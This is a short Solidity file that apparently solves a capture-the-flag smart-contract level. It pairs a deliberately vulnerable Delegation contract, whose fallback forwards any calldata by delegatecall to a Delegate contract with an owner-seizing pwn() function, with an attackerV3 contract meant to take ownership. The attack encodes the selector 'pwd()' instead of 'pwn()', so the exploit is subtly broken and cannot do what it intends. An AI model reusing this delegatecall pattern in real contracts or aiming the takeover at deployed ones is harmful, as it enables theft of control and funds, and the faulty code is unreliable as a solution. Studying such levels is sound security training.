// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract attackerV3 {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _target ) public {
        bytes memory data = abi.encodeWithSignature("pwd()");
        (bool result, ) = address(_target).call(data);
            if (result) {
            this;
            }
    }
}